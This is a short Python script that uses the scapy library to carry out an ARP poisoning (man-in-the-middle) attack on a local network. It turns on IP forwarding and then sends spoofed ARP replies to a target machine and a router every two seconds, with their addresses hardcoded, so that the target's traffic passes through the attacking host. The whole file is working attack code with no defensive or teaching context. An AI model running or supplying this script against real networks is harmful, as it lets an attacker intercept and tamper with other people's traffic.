from scapy.all import *
import os
from time import sleep

def ArpPoison(targetIP):
    routerIP = "192.168.0.100"
    targetIP = "192.168.0.21"
    routerMAC = "00:1a:6d:38:15:ff"
    targetMAC = "98:90:96:dd:01:5c"
    hostMAC = "98:90:96:dc:ee:77"

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    while 1:
        sendp(Ether(src=hostMAC, dst=targetMAC)/ARP(op=2, pdst=targetIP, psrc=routerIP, hwdst=targetMAC))
        sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=targetIP, hwdst=routerMAC))
        sleep(2)
